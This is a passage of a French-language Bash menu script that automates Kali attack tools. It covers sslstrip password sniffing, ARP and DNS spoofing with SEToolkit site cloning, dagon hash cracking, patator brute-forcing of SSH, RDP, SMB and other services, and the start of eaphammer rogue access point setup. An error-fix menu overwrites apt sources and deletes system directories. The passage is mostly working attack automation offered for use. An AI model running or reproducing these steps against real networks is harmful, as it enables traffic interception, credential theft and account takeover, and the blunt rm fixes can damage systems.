	#~ elif [[ "$REIN" = "back" || "$REIN" = "b" ]]
	#~ then
		#~ clear
		#~ break
	#~ elif [[ "$REIN" = "00" ]]
	#~ then	
		#~ exec bash "$0"
	#~ elif [[ "$REIN" = "0" ]]
	#~ then
		#~ clear
		#~ exit
	#~ fi
	#~ done
}
function errors_menu
{
while true
do
clear
TERMINALTITLE="ERREURS"
dash_calc
printf '\033]2;ERREURS\a'
echo -e ""$YS" 1"$CE") Régler les problèmes audio"
echo -e ""$YS" 2"$CE") No output in wash"
echo -e ""$YS" 3"$CE") Pas de plein écran"
echo -e ""$YS" 4"$CE") Erreur lors de la construction du proxy pour org.gnome.Terminal"
echo -e ""$YS" 5"$CE") Erreur lors du lancement su service apache2"
echo -e ""$YS" 6"$CE") Erreurs durant apt-get update"
echo -e ""$YS" 7"$CE") Erreurs lors de la création d'un payload avec Winpayloads"
echo -e ""$YS" 8"$CE") Le correctif pour le service apache2 n'a pas pu démarrer"
echo -e ""$YS" 9"$CE") Impossible de capturer handshake-pyrit verification toujours mauvaise"
echo -e ""$YS" b"$CE") Retour"
echo -e ""$YS" 0"$CE") QUITTER"
echo -e " Choix: "
read ERRS
clear
if [[ "$ERRS" = "1" ]]
then
	clear
	echo -e "J'essaie de vous mettre de l'audio..."
	sleep 2
	clear
	echo -e "Tapez "$YS"y"$CE" si/quand vous y êtes invité"
	sleep 3
	clear
	echo -e "Installation de pulseaudio......."
	sleep 1
	apt-get pulseaudio
	echo -e "Activation de pulseaudio......."
	sleep 1
	systemctl --user enable pulseaudio && systemctl --user start pulseaudio
	clear
	echo -e "Fait!"
	sleep 1
	clear
	echo -e "Je vois...Essayez de voir si vous avez du son."
	sleep 3
	echo -e " "
	echo -e "C'est tout ce que je peux faire :/"
	sleep 2
	echo -e " "
	echo -e "Si le problème persiste essayez de redémarrer"
elif [[ "$ERRS" = "2" ]]
then
	clear
	echo -e "Ok...Essayons de résoudre le problème..."
	sleep 1
	mkdir /etc/reaver
	echo -e "Il semble être corrigé."
	echo -e "Entrez votre interface"
	read INTWASH
	echo -e "Appuyez sur "$YS"une touche"$CE" pour essayer Wash"
	echo -e "Essayez aussi "wash -i wlan0mon -a" pour voir tous les réseaux"
	wash -i $INTWASH
elif [[ "$ERRS" = "3" ]]
then
	apt-get install -y open-vm-tools-desktop fuse
	echo -e "Relancez votre machine virtuelle..."
	sleep 2
	echo -e "$PAKTGB"
	$READAK
elif [[ "$ERRS" = "4" ]]
then
	locale-gfr #locale-gen
	localectl set-locale LANG="fr_FR.UTF-8"
	sleep 2
	echo -e "Redémarrez votre système maintenant"
	sleep 3
elif [[ "$ERRS" = "5" ]]
then
	service nginx stop
	echo -e "Je pense avoir réglé le problème. Essayez encore: service apache2 start "
	sleep 5
elif [[ "$ERRS" = "6" ]]
then
	echo "deb http://http.kali.org/kali kali-rolling main non-free contrib" > /etc/apt/sources.list
	rm -r -f /etc/apt/sources.list.d/*
	echo -e "Essayez   apt-get update    encore. C'est tout ce que je peux faire."
	sleep 3
elif [[ "$ERRS" = "7" ]]
then
	rm -f -r /usr/local/lib/python2.7/dist-packages/Crypto
	echo -e "Problème corrigé!"
	echo -e "$PAKTGB"
	$READAK
elif [[ "$ERRS" = "8" ]]
then
	apt-get -y remove nginx
	apt-get -y remove nginx-full
	apt-get -y remove nginx-common
	apt-get -y autoremove
	clear
	echo -e "Problème corrigé!"
	echo -e "$PAKTGB"
	$READAK
elif [[ "$ERRS" = "9" ]]
then
	wget -O /tmp/scapy2.3.2.tar.gz https://pypi.python.org/packages/6d/72/c055abd32bcd4ee6b36ef8e9ceccc2e242dea9b6c58fdcf2e8fd005f7650/scapy-2.3.2.tar.gz; sudo pip2 install /tmp/scapy2.3.2.tar.gz
	clear
	echo -e "Problème corrigé!"
	echo -e "$PAKTGB"
	$READAK
elif [[ "$ERRS" = "back" || "$ERRS" = "b" || "$ERRS" = 00 ]]
then
	BACKL="1"
	break
elif [[ "$ERRS" = "0" ]]
then
	clear
	exit
else
	clear
	echo -e "Option non valide...."
	sleep 2
fi
done
}
function keyboard_shortcuts
{
if [[ ! -d ""$KSPATH"" ]]
then
	mkdir "$KSPATH"
fi
while true
do
TERMINALTITLE="RACCOURCIS CLAVIER"
dash_calc
printf '\033]2;RACCOURCIS CLAVIER\a'
echo -e ""$YS" 1"$CE") Outils"
echo -e ""$YS" 2"$CE") Voir les raccourcis cachés"
echo -e ""$YS" b"$CE") Retour"
#~ echo -e ""$YS"00"$CE") Menu principal"
echo -e ""$YS" 0"$CE") QUITTER"
read KS
clear
if [[ "$KS" = "1" ]]
then
	while true
	do
		echo -e "Raccourcis disponibles:                        "$YS"reset"$CE") Supprimer tous les raccourcis"
		nn=1
		#commencer à trier tous les raccourcis disponibles
		HOWADD=$(( HOWMANYTOOLS + 1 )) 
		while [ "$nn" != "$HOWADD" ]
		do
		listshortcuts
		#ajouter un espace là où cela est nécessaire sur la sortie, donc il sera trié correctement
		if [[ "$nn" -lt "10" ]]
		then
			n=" $nn"
		else
			n="$nn"
		fi
		if [[ ! -f ""$KSPATH"/"$TITLE"/"$TITLE".txt" ]]
		then
			echo -e ""$YS""$n""$CE") "$TITLE""
		else
			read KSKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
			if [[ "$KSKS" = "" ]]
			then
				KSKS="ERROR(fix=recreate the shortcut)"
			else
				read currentks < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
				size=${#TITLE}
				calc=$(( 35-size ))
				numcalc=1
				SPACES=""
				while [ $numcalc != $calc ]
				do
					SPACES=""$SPACES"_"
					numcalc=$(( numcalc+1 ))
				done
				#~ read SPACES < "$KSPATH"/spaces.txt
				echo -e ""$YS""$n""$CE") "$TITLE""$SPACES""$KSKS""
			fi
		fi
		nn=$(( nn+1 ))
		done
		echo -e ""$YS" b"$CE") Retour"
		#echo -e ""$YS" 0"$CE") QUITTER"
		echo -e "Choix: "
		#nn=""
		read nn
		clear
		listshortcuts
		if [[ "$nn" = "" ]]
		then
			continue
		fi
		if [[ "$nn" = "back" || "$nn" = "b" ]]
		then
			clear
			break
		elif [[ "$nn" = "0" ]]
		then
			clear
			exit
		elif [[ "$nn" = "00" ]]
		then
			exec bash "$0"
		elif [[ "$nn" = "reset" ]]
		then
			rm -r "$KSPATH"/*
		elif [[ "$nn" -le "$HOWMANYTOOLS" ]]
		then
			createshortcut
		fi
		done
	elif [[ "$KS" = "2" ]]
	then
		hidden_shortcuts
	elif [[ "$KS" = "back" || "$KS" = "b" ]]
	then
		BACKL="1"
		clear
		break
	elif [[ "$KS" = "0" ]]
	then
		clear
		exit
	elif [[ "$KS" = "00" ]]
	then
		exec bash "$0"
	fi
done
}
function mitm_menu
{
clear
TERMINALTITLE="MITM"
dash_calc
printf '\033]2;MITM\a'
echo -e ""$YS" 1"$CE") Password sniff-sslstrip"
echo -e ""$YS" 2"$CE") SET + mitm + dnsspoofing"
echo -e ""$YS" b"$CE") Retour"
echo -e ""$YS" 0"$CE") QUITTER"
read MITMATT
clear
if [[ "$MITMATT" = "1" ]]
then
	while true
	do
	clear
	echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
	echo -e ""$YS" 1"$CE") Activer ip_forward                 "$YS"d1"$CE") Désactiver ip_forward "
	echo -e ""$YS" 2"$CE") Paramétrer iptables"
	echo -e ""$YS" 3"$CE") Scanner & sélectionner l'IP cible  "$YS"33"$CE") J'ai scanné"
	echo -e ""$YS" 4"$CE") Ouvrir le journal sslstrip"        # "$YS"44"$CE") Filtrer les informations d'identification"
	echo -e ""$YS" b"$CE") Retour"
	echo -e ""$YS" 0"$CE") QUITTER"
	echo -e "Choix: "
	read -e MITMCH
	if [[ "$MITMCH" = "1" ]]
	then
		echo "1" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMCH" = "d1" ]]
	then
		echo "0" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMCH" = "2" ]]
	then
		clear
		echo -e "Rediriger le tcp port 80 au port ("$YS"Entrer"$CE"=8080):"
		read PORTTCP
		if [[ "$PORTTCP" = "" ]]
		then
			PORTTCP="8080"
		fi
					clear
		echo -e "Rediriger l'udp port 40 au port("$YS"Entrer"$CE"=40):"
		read PORTUDP
		if [[ "$PORTUDP" = "" ]]
		then
			PORTUDP="40"
		fi
		iptables --flush
		iptables --flush -t nat
		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PORTTCP
		iptables -t nat -A PREROUTING -p udp --destination-port 40 -j REDIRECT --to-port $PORTUDP
		echo -e "Fait."
		sleep 1
	elif [[ "$MITMCH" = "3" ]]
	then
		clear
		route -n
		echo -e ""
		echo -e ""
		echo -e "Entrez votre passerelle(passerelle préféré "$ETH"):"
		read GATENM
		echo -e ""
		echo -e "Entrez dans l'interface de la passerelle("$YS"Entrer"$CE"="$ETH"):"
		read GATEINT
		if [[ "$GATEINT" = "" ]]
		then
			GATEINT="$ETH"
		fi	
		while true
		do	
		clear
		nmap -sP "$GATENM"/24
		echo -e ""
		echo -e ""
		echo -e "Entrer l'IP cible:"
		read TARGIP
		if [[ "$TARGIP" = "r" ]]
		then
			continue
		else
			break
		fi
		done
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		export GATENM
		export GATEINT
		export TARGIP
		export PORTTCP
		export PORTUDP
		cd "$LPATH"/ls
		gnome-terminal --geometry 60x12+0+999999 -e ./l131.sh
		gnome-terminal --geometry 60x20+999999+999999 -e ./l133.sh
		gnome-terminal --geometry 60x20+999999+0 -e ./l132.sh
		sslstrip -l $PORTTCP -w /root/sslstrip.log
		echo -e "$PAKTGB"
		$READAK
		continue
	elif [[ "$MITMCH" = "33" ]]
	then
		clear
		echo -e "Entrez votre passerelle(passerelle préféré "$ETH"):"
		read GATENM
		echo -e ""
		echo -e "Entrez dans l'interface de la passerelle("$YS"Entrer"$CE"="$ETH"):"
		read GATEINT
		if [[ "$GATEINT" = "" ]]
		then
			GATEINT="$ETH"
		fi
		clear
		echo -e "Entrer l'IP cible("$YS"r"$CE"=rescanner):"
		read TARGIP
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		export GATENM
		export GATEINT
		export TARGIP
		export PORTTCP
		export PORTUDP
		cd "$LPATH"/ls
		gnome-terminal --geometry 60x25+0+999999 -e ./l131.sh
		gnome-terminal --geometry 60x25+999999+0 -e ./l132.sh
		gnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh
		sslstrip -l $PORTTCP -w /root/sslstrip.log
		echo -e "$PAKTGB"
		$READAK
		continue
	elif [[ "$MITMCH" = "4" ]]
	then
		leafpad /root/sslstrip.log
	#~ elif [[ "$MITMCH" = "44" ]]
	#~ then
	elif [[ "$MITMCH" = "back" || "$MITMCH" = "b" ]]
	then
		clear
		break
	elif [[ "$MITMCH" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$MITMCH" = "0" ]]
	then
		clear
		exit
	fi
	done
elif [[ "$MITMATT" = "2" ]]
then
	while true
	do
	clear
	echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
	echo -e ""$YS" 1"$CE") Activer ip_forward                 "$YS"d1"$CE") Désactiver ip_forward"
	echo -e ""$YS" 2"$CE") Scanner & sélectionner l'IP cible  "$YS"22"$CE") J'ai scanné"
	echo -e ""$YS" 3"$CE") Lancer ARPspoofing"
	#~ echo -e ""$YS" 4"$CE") Lancer le service apache2          "$YS"d4"$CE") Stopper le service apache2"
	echo -e ""$YS" 4"$CE") Lancer SEToolkit"
	echo -e ""$YS" 5"$CE") Lancer DNSspoofing"
	echo -e ""$YS" b"$CE") Retour"
	echo -e ""$YS" 0"$CE") QUITTER"
	echo -e "Choix: "
	read -e MITMSET
	clear
	if [[ "$MITMSET" = "1" ]]
	then
		echo "1" > /proc/sys/net/ipv4/ip_forward
		echo -e "Fait."
		sleep 1
	elif [[ "$MITMSET" = "d1" ]]
	then
		echo "0" > /proc/sys/net/ipv4/ip_forward
		echo -e "Fait."
		sleep 1
	elif [[ "$MITMSET" = "2" ]]
	then
		route -n
		echo -e ""
		echo -e ""
		echo -e "Entrez votre passerelle:"
		read GATENM
		echo -e ""
		echo -e "Entrez l'interface de votre passerelle(e.g: wlan0):"
		read GATEINT
		while true
		do		
		clear
		nmap -sP "$GATENM"/24
		echo -e ""
		echo -e ""
		echo -e "Entrez l'IP cible("$YS"r"$CE"=rescanner):"
		read TARGIP
		if [[ "$TARGIP" = "r" ]]
		then
			continue
		else
			break
		fi
		done
	elif [[ "$MITMSET" = "22" ]]
	then
		echo -e "Entrez votre passerelle:"
		read GATENM
		echo -e ""
		echo -e "Entrez l'interface de votre passerelle(e.g: wlan0):"
		read GATEINT
		clear
		echo -e "Entrez l'IP cible:"
		read TARGIP
	elif [[ "$MITMSET" = "3" ]]
	then
		export PAKTC
		export GATEINT
		export TARGIP
		export GATENM
		cd "$LPATH"/ls
		gnome-terminal --geometry 60x15+999999+0 -e ./l132.sh
		gnome-terminal --geometry 60x15+999999+999999 -e ./l133.sh
	#~ elif [[ "$MITMSET" = "4" ]]
	#~ then
		#~ service apache2 start
	#~ elif [[ "$MITMSET" = "d4" ]]
	#~ then
		#~ service apache2 stop
	elif [[ "$MITMSET" = "4" ]]
	then
		echo -e "Cloner un site web sur l'une des adresses IP suivante(s):"
		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
		echo -e "$PAKTC"
		$READAK
		gnome-terminal --geometry 66x40+999999+0 -e setoolkit
	elif [[ "$MITMSET" = "5" ]]
	then
		echo -e "Création de votre fichier hosts.txt"
		echo -e ""
		echo -e "Entrez votre IP que vous avez démarré le serveur:"
		echo -e "Une de celles-ci:"
		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
		read -e SERVIP
		echo -e "Entrez l'interface de cette IP(e.g: wlan0):"
		read -e INTIP
		if [[ -f ""$LPATH"/HOSTS/hosts.txt" ]]
		then
			rm "$LPATH"/HOSTS/hosts.txt
		fi
		mkdir "$LPATH"/HOSTS
		clear
		while true
		do
		clear
		echo -e "Entrez l'URL à partir de laquelle vous souhaitez rediriger votre IP(e.g: thisis.myfakesite.com):"
		read -e URL
		echo "$SERVIP	$URL" >> "$LPATH"/HOSTS/hosts.txt
		sleep 0.2
		clear
		echo -e "En ajouter une autre?"$YNYES""
		read -e ANOTHERHOST
		if [[ "$ANOTHERHOST" = "n" ]]
		then
			break
		fi
		done
		clear
		echo -e "Démarrage de dnsspoof..."
		echo -e "$PAKTC"
		$READAK
		export INTIP
		xterm -geometry 60x15+0+999999 -e 'dnsspoof -i $INTIP -f "$LPATH"/HOSTS/hosts.txt'				
	elif [[ "$MITMSET" = "back" || "$MITMSET" = "b" ]]
	then
		clear
		break
	elif [[ "$MITMSET" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$MITMSET" = "0" ]]
	then
		clear
		exit
	fi
	done
elif [[ "$MITMATT" = "back" || "$MITMATT" = "b" ]]
then
	BACKL="1"
	break
elif [[ "$MITMATT" = "00" ]]
then			
	clear
	exec bash "$0"
elif [[ "$MITMATT" = "0" ]]
then
	clear
	exit
fi
}
function dagon_script
{
while true
do
	clear
	TERMINALTITLE="DAGON"
	dash_calc
	printf '\033]2;DAGON\a'
	if [[ "$HASH" = "" || "$HASH" = "\e[1;31mNONE\e[0m" ]]
	then
		HASH="\e[1;31mNONE\e[0m"
		OK=0
	fi
	if [[ "$CORV" = "" ]]
	then
		CORV="crack"
	fi
	echo -e "-----------------Options basiques-----------------"
	echo -e ""$YS" 1"$CE") Spécifiez votre hash(es)     ACTUEL:$HASH"
	echo -e ""$YS" 2"$CE") Cracker/vérifier             ACTUEL:$CORV"
	if [[ -f /root/lscript/hashlog.txt ]]
	then
		echo -e ""$YS" 3"$CE") Afficher votre dernier log"
	else
		echo -e ""$RS" 3"$CE") Afficher votre dernier log"
	fi
	echo -e "--------------------Optionnel--------------------"
	if [[ "$DICTATTACK" = "" ]]
	then
		DICTATTACK="OFF"
	fi
	echo -e ""$YS" 4"$CE") Attaque par dictionnaire     ACTUEL:$DICTATTACK"
	if [[ "$DICT" = "" && $DICTATTACK = "OFF" ]]
	then
		DICT="OFF"
	elif [[ "$DICT" = "\e[1;31mNONE\e[0m" && $DICTATTACK = "OFF" ]]
	then
		DICT="OFF"
	elif [[ "$DICT" = "OFF" && $DICTATTACK = "ON" ]]
	then
		DICT="\e[1;31mNONE\e[0m"
	elif [[ "$DICT" = "" && $DICTATTACK = "ON" ]]
	then
		DICT="\e[1;31mNONE\e[0m"
	fi
	if [[ "$DICTTYPE" = 1 ]]
	then
		DICT="$DICTPATH"
	elif [[ "$DICTTYPE" = 2 ]]
	then
		DICT="multiple"
	elif [[ "$DICTTYPE" = 3 ]]
	then
		DICT="$DICTPATH folder"
	fi
	echo -e "   "$YS"5"$CE") Spécifier le dictionnaire   ACTUEL:$DICT"
	echo -e "------------------------------------------------"
	echo -e ""$YS" b"$CE") Retour              "$YS"update"$CE") Update dagon"
	echo -e ""$YS"start"$CE") Lancer"
	echo -e "Choix: "
	read DAGON
	clear
	if [[ "$DAGON" = "back" || "$DAGON" = "b" ]]
	then
		break
	elif [[ "$DAGON" = "4" ]]
	then
		if [[ "$DICTATTACK" = "OFF" ]]
		then
			DICTATTACK="ON"
		else
			DICTATTACK="OFF"
		fi
	elif [[ "$DAGON" = "update" ]]
	then
		cd /root/dagon
		python dagon.py --update
		sleep 3
	elif [[ "$DAGON" = "start" ]]
	then
		if [[ "$HASH" = "" || "$HASH" = "\e[1;31mNONE\e[0m" ]]
		then
			echo -e ""$RS"Aucun hash sélectionné."$CE""
			sleep 3
		fi
		if [[ "$DICTATTACK" = "ON" && $DICT = "\e[1;31mNONE\e[0m" ]]
		then
			echo -e ""$RS"Aucun dictionnaire sélectionné, mais l'option dictionnaire est activé"$CE""
			sleep 5
			continue
		fi
		cd /root/dagon
		if [[ "$HASHTYPE" = 1 ]]
		then
			if [[ "$CORV" = "crack" ]]
			then
				HASHCOMMAND="python dagon.py -c "$HASH" --bruteforce"
			else
				HASHCOMMAND="python dagon.py -v "$HASH""
			fi
		elif [[ "$HASHTYPE" = 2 || "$HASHTYPE" = 3 ]]
		then
			if [[ "$CORV" = "crack" ]]
			then
				HASHCOMMAND="python dagon.py -l "$HASH" --bruteforce"
			else
				HASHCOMMAND="python dagon.py -V "$HASH""
			fi
		fi
		if [[ "$DICTATTACK" = "ON" ]]
		then
			if [[ "$DICTTYPE" = 1 ]]
			then
				DICTCOMMAND="-w $DICTPATH"
			elif [[ "$DICTTYPE" = 2 ]]
			then
				DICTCOMMAND="-W $DICTPATH"
			elif [[ "$DICTTYPE" = 3 ]]
			then
				DICTCOMMAND="-D $DICTPATH"	
			fi
		else
			DICTCOMMAND=""
		fi	
		
	$HASHCOMMAND $DICTCOMMAND | tee "$LPATH/hashlog.txt"
	echo -e "$PAKTGB"
	$READAK
	elif [[ "$DAGON" = 5 ]]
	then
		echo -e ""$YS" 1"$CE") Sélectionner un dictionnaire"
		echo -e ""$YS" 2"$CE") Sélectionner plusieurs dictionnaires"
		echo -e ""$YS" 3"$CE") Sélectionner un dossier avec des dictionnaires"
		echo -e ""$YS" b"$CE") Retour"
		echo -e "Choix: "
		read DICTSEL
		clear
		if [[ "$DICTSEL" = 1 ]]
		then
			echo -e "Entrez le chemin du dictionnaire:"
			read DICTPATH
			if [[ ! -f "$DICTPATH" ]]
			then
				echo -e ""$RS"Aucun fichier"$CE""
				sleep 2
				continue
			fi
			DICTTYPE=1
		elif [[ "$DICTSEL" = 2 ]]
		then
			echo -e "Entrez le chemin du 1er dictionnaire:"
			read DICTPATH
			if [[ ! -f "$DICTPATH" ]]
			then
				echo -e ""$RS"Aucun fichier"$CE""
				sleep 2
				continue
			fi
			while true
			do
				clear
				echo -e ""$RS"----------POUR STOPPER, TAPEZ 0----------"
				echo -e "Entrez le chemin du dictionnaire suivant: "
				read DICTNEXT
				if [[ "$DICTNEXT" = "0" || "$DICTNEXT" = "o" || "$DICTNEXT" = "O" ]]
				then
					DICTTYPE=2
					break
				fi
			if [[ ! -f "$DICTNEXT" ]]
			then
				echo -e ""$RS"Aucun fichier"$CE""
				sleep 2
				continue
			fi
				DICTPATH=""$DICTPATH","$DICTNEXT""
			done
		elif [[ "$DICTSEL" = 3 ]]
		then
			echo -e "Entrez le chemin du dossier:"
			read DICTPATH
			if [[ ! -d "$DICTPATH" ]]
			then
				echo -e ""$RS"Aucun dossier"$CE""
				sleep 2
				continue
			fi
			DICTTYPE=3
		elif [[ "$DICTSEL" = "back" || "$DICTSEL" = "b" ]]
		then
			continue
		fi
	elif [[ "$DAGON" = 3 ]]
	then
		if [[ ! -f /root/lscript/hashlog.txt ]]
		then
			echo -e ""$RS"Aucun log trouvé."$CE""
			sleep 2
		else
			cat /root/lscript/hashlog.txt
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [[ "$DAGON" = 1 ]]
	then
		clear
		echo -e ""$YS" 1"$CE") Entrer un hash"
		echo -e ""$YS" 2"$CE") Entrer plusieurs hashes"
		echo -e ""$YS" 3"$CE") Sélectionner un fichier avec des hashes"
		echo -e ""$YS" b"$CE") Retour"
		echo -e "Choix: "
		read HASHES
		clear
		if [[ "$HASHES" = "back" || "$HASHES" = "b" ]]
		then
			continue
		elif [[ "$HASHES" = 1 ]]
		then
			echo -e "Entrez votre hash: "
			read HASH
			HASHTYPE=1
		elif [[ "$HASHES" = 2 ]]
		then
			echo -e "Entrez votre premier hash: "
			read HASH
			echo -e "$HASH" > $LPATH/hashes.txt
			while true
			do
				clear
				echo -e ""$RS"----------POUR STOPPER, TAPEZ 0----------"
				echo -e "Entrez votre hash suivant: "
				read HASH
				if [[ "$HASH" = "0" || "$HASH" = "o" || "$HASH" = "O" ]]
				then
					HASH="multiple"
					break
				fi
				echo -e "$HASH" >> $LPATH/hashes.txt
			done
			HASHTYPE=2
		elif [[ "$HASHES" = 3 ]]
		then
			echo -e "Entrez le chemin complet du fichier: "
			read HASHPATH
			if [[ ! -f "$HASHPATH" ]]
			then
				echo -e ""$RS"Il n'y a aucun fichier."$CE""
				sleep 3
			else
				HASH="$HASHPATH"
			fi
			HASHTYPE=3
		fi
	elif [[ "$DAGON" = 00 ]]
	then
		exec bash $0
	elif [[ "$DAGON" = 0 ]]
	then
		clear
		exit
	elif [[ "$DAGON" = 2 ]]
	then
		if [[ "$CORV" = "crack" ]]
		then
			CORV="verify"
		else
			CORV="crack"
		fi
	fi
done
}
function patator_automation
{
while true
do
		clear
		echo -e ""$BS"Modes"$CE":"
	pttr=$(cat <<EOF
$YS  1$CE) ftp_login      : Brute-force FTP
$YS  2$CE) ssh_login      : Brute-force SSH
$YS  3$CE) telnet_login   : Brute-force Telnet
$YS  4$CE) smtp_login     : Brute-force SMTP
$YS  5$CE) smtp_vrfy      : Enumerate valid users using the SMTP VRFY command
$YS  6$CE) smtp_rcpt      : Enumerate valid users using the SMTP RCPT TO command
$YS  7$CE) finger_lookup  : Enumerate valid users using Finger
$YS  8$CE) http_fuzz      : Brute-force HTTP/HTTPS
$YS  9$CE) ajp_fuzz       : Brute-force AJP
$YS 10$CE) pop_login      : Brute-force POP
$YS 11$CE) pop_passd      : Brute-force poppassd (not POP3)
$YS 12$CE) imap_login     : Brute-force IMAP
$YS 13$CE) ldap_login     : Brute-force LDAP
$YS 14$CE) smb_login      : Brute-force SMB
$YS 15$CE) smb_lookupsid  : Brute-force SMB SID-lookup
$YS 16$CE) rlogin_login   : Brute-force rlogin
$YS 17$CE) vmauthd_login  : Brute-force VMware Authentication Daemon
$YS 18$CE) mssql_login    : Brute-force MSSQL
$YS 19$CE) oracle_login   : Brute-force Oracle
$YS 20$CE) mysql_login    : Brute-force MySQL
$YS 21$CE) mysql_query    : Brute-force MySQL queries
$YS 22$CE) rdp_login      : Brute-force RDP (NLA)
$YS 23$CE) pgsql_login    : Brute-force PostgreSQL
$YS 24$CE) vnc_login      : Brute-force VNC
$YS 25$CE) dns_forward    : Brute-force DNS
$YS 26$CE) dns_reverse    : Brute-force DNS (reverse lookup subnets)
$YS 27$CE) ike_enum       : Enumerate IKE transforms
$YS 28$CE) snmp_login     : Brute-force SNMPv1/2 and SNMPv3
$YS 29$CE) unzip_pass     : Brute-force the password of encrypted ZIP files
$YS 30$CE) keystore_pass  : Brute-force the password of Java keystore files
$YS 31$CE) sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases
$YS 32$CE) umbraco_crack  : Crack Umbraco HMAC-SHA1 password hashes
EOF
)
	echo -e "$pttr"
	echo -e "Choix: "
	read PT
	if [[ "$PT" = 1 ]]
	then
		XPT="ftp_login"
	elif [[ "$PT" = 2 ]]
	then
		XPT="ssh_login"
	elif [[ "$PT" = 3 ]]
	then
		XPT="telnet_login"
	elif [[ "$PT" = 4 ]]
	then
		XPT="smtp_login"
	elif [[ "$PT" = 5 ]]
	then
		XPT="smtp_vrfy"
	elif [[ "$PT" = 6 ]]
	then
		XPT="smtp_rcpt"
	elif [[ "$PT" = 7 ]]
	then
		XPT="finger_lookup"
	elif [[ "$PT" = 8 ]]
	then
		XPT="http_fuzz"
	elif [[ "$PT" = 9 ]]
	then
		XPT="ajp_fuzz"
	elif [[ "$PT" = 10 ]]
	then
		XPT="pop_login"
	elif [[ "$PT" = 11 ]]
	then
		XPT="pop_passd"
	elif [[ "$PT" = 12 ]]
	then
		XPT="imap_login"
	elif [[ "$PT" = 13 ]]
	then
		XPT="ldap_login"
	elif [[ "$PT" = 14 ]]
	then
		XPT="smb_login"
	elif [[ "$PT" = 15 ]]
	then
		XPT="smb_lookupsid"
	elif [[ "$PT" = 16 ]]
	then
		XPT="rlogin_login"
	elif [[ "$PT" = 17 ]]
	then
		XPT="vmauthd_login"
	elif [[ "$PT" = 18 ]]
	then
		XPT="mssql_login"
	elif [[ "$PT" = 19 ]]
	then
		XPT="oracle_login"
	elif [[ "$PT" = 20 ]]
	then
		XPT="mysql_login"
	elif [[ "$PT" = 21 ]]
	then
		XPT="mysql_query"
	elif [[ "$PT" = 22 ]]
	then
		XPT="rdp_login"
	elif [[ "$PT" = 23 ]]
	then
		XPT="pgsql_login"
	elif [[ "$PT" = 24 ]]
	then
		XPT="vnc_login"
	elif [[ "$PT" = 25 ]]
	then
		XPT="dns_forward"
	elif [[ "$PT" = 26 ]]
	then
		XPT="dns_reverse"
	elif [[ "$PT" = 27 ]]
	then
		XPT="ike_enum"
	elif [[ "$PT" = 28 ]]
	then
		XPT="snmp_login"
	elif [[ "$PT" = 29 ]]
	then
		XPT="unzip_pass"
	elif [[ "$PT" = 30 ]]
	then
		XPT="keystore_pass"
	elif [[ "$PT" = 31 ]]
	then
		XPT="sqlcipher_pass"
	elif [[ "$PT" = 32 ]]
	then
		XPT="umbraco_crack"
	fi
	if [[ "$XPT" = "" ]]
	then
		echo -e ""$RS"Mauvais choix"$CE""
		sleep 3
		continue
	else
		cd /root/patator
		export XTP
		xterm -T "INSTRUCTIONS" -hold -e "echo -e "---------------------------------------" && echo -e 'start with: python patator.py $XPT' && echo -e "---------------------------------------" && python patator.py $XPT" & disown
		xterm -T "PATATOR" -hold & disown
	fi
done
}
function eaphammer_automation
{
			while true
			do
				clear
				TERMINALTITLE="EAPHAMMER"
				dash_calc
				printf '\033]2;EAPHAMMER\a'
				if [[ "$EAPHIFACE" = "" ]]
				then
					EAPHIFACE="$WLANN"
				fi
				if [[ "$EAPHESSID" = "" ]]
				then
					EAPHESSID=""$RS"NONE"$CE""
					OK1=0
				elif [[ "$EAPHESSID" != "\e[1;31mNONE\e[0m" ]]
				then
					OK1=1
				fi
				if [[ "$EAPHBSSID" = "" ]]
				then
					EAPHBSSID=""$RS"NONE"$CE""
					OK1=0
				fi
				if [[ "$EAPHCHANNEL" = "" ]]
				then
					EAPHCHANNEL=""$RS"NONE"$CE""
					OK1=0
				fi
				if [[ "$EAPHWPA" = "" ]]
				then
					EAPHWPA="2"
				fi
				if [[ "$EAPHAUTH" = "" ]]
				then
					EAPHAUTH=""$RS"NONE"$CE""
					OK1=0
				fi
				if [[ "$EAPHCREDS" = "" ]]
				then
					EAPHCREDS="OFF"
				fi
				if [[ "$EAPHHOSTILE" = "" ]]
				then
					EAPHHOSTILE="OFF"
				fi
				if [[ "$EAPHCAPTIVE" = "" ]]
				then
					EAPHCAPTIVE="OFF"
				fi
				if [[ "$EAPHPIVOT" = "" ]]
				then
					EAPHPIVOT="OFF"
				fi
				if [[ "$EAPHKARMA" = "" ]]
				then
					EAPHKARMA="OFF"
				fi
				if [[ "$EAPHAIRCRACK" = "" ]]
				then
					EAPHAIRCRACK="OFF"
				fi
				if [[ "$EAPHINTAUTO" = "" ]]
				then
					EAPHINTAUTO="OFF"
				fi
				if [[ "$EAPHAIRCRACK" = "OFF" && "$EAPHINTAUTO" = "OFF" && "$EAPHWORD" = "" ]]
				then
					EAPHWORD="OFF"
				fi
				if [[ "$EAPHAIRCRACK" = "OFF" && "$EAPHINTAUTO" = "OFF" && "$EAPHWORD" = "OFF" ]]
				then
					EAPHWORD="OFF"
				fi
				OK2=1
				if [[ "$EAPHAIRCRACK" != "OFF" ]]
				then
					if [[ "$EAPHWORD" = "OFF" || "$EAPHWORD" = "\e[1;31mNONE\e[0m" ]]
					then
						EAPHWORD="\e[1;31mNONE\e[0m"
						OK2=0
					fi
				fi
				if [[ "$EAPHINTAUTO" = "ON" || "$EAPHWORD" = "\e[1;31mNONE\e[0m" ]]
				then
					if [[ "$EAPHWORD" = "OFF" ]]
					then
						EAPHWORD="\e[1;31mNONE\e[0m"
						OK2=0
					fi
				fi
